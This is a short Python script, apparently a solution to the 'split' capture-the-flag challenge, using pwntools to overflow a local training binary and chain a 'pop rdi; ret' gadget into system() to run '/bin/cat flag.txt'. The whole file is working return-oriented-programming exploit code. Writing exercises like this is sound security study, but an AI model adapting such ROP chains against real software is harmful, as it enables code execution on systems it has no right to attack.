from pwn import *

p = process('./split')
junk = "A" * 40

# r2 split
# [0x00400650]> /R pop rdi; ret

#  0x00400883                 5f  pop rdi
#  0x00400884                 c3  ret


# 00000000004005e0 <system@plt>:
# 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt

pr_addr = 0x400883
sys_addr = 0x4005e0
cat_addr = 0x601060

p.recvuntil('> ')
payload = junk + p64(pr_addr) + p64(cat_addr) + p64(sys_addr)
p.sendline(payload)
#p.recvuntil('Exiting')

p.interactive()
